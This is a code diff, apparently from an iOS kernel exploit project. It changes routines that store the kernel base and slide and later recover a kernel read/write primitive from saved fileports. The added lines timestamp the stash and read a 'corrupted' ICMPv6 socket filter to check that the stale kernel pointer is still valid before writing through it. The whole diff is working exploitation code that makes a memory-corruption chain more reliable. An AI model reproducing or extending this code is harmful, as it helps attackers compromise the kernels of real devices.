@@ -9,6 +9,10 @@
 #import <dlfcn.h>
 #include <errno.h>
 #include <string.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/icmp6.h>
 #include "fileport.h"
 #include "darksword.h"
 #include "offsets.h"
@@ -128,6 +132,7 @@ static bool persist_simple_stash(void)
     NSDictionary *primitive = @{
         @"KernelBase" : @(kernel_base),
         @"KernelSlide" : @(kernel_slide),
+        @"StashEpoch" : @((double)time(NULL)),
     };
     NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
     [defaults setObject:primitive forKey:PERSIST_SIMPLE_KEY];
@@ -164,6 +169,30 @@ static bool persist_simple_recover(void)
     PERSIST_LOG("simple: fileport_makefd control=%d rw=%d errno=%d\n", controlFd, rwFd, errno);
     if (controlFd < 0 || rwFd < 0) {
         persist_simple_forget("fileport_makefd failed");
+        return false;
+    }
+
+    double stashedEpoch = [primitive[@"StashEpoch"] doubleValue];
+    if (stashedEpoch > 0) {
+        PERSIST_LOG("simple: stash age %.1f min\n", (time(NULL) - stashedEpoch) / 60.0);
+    }
+
+    // Read-only probe through the corrupted control filter BEFORE any
+    // destructive SET: a decayed chain would otherwise write 32 bytes of
+    // garbage into whatever memory its stale pointer now targets.
+    uint8_t probe[0x20];
+    socklen_t probeLen = sizeof(probe);
+    int probeRes = getsockopt(controlFd, IPPROTO_ICMPV6, ICMP6_FILTER, probe, &probeLen);
+    int probeErrno = errno;
+    uint64_t probePtr = probeRes == 0 ? *(uint64_t *)probe : 0;
+    PERSIST_LOG("simple: probe getsockopt(control) res=%d errno=%d ptr=0x%llx\n",
+                probeRes, probeErrno, (unsigned long long)probePtr);
+    if (probeRes != 0) {
+        persist_simple_forget("probe getsockopt failed, chain decayed");
+        return false;
+    }
+    if (probePtr <= 0xffff000000000000ULL) {
+        persist_simple_forget("probe: stale filter target, chain decayed");
         return false;
     }
 
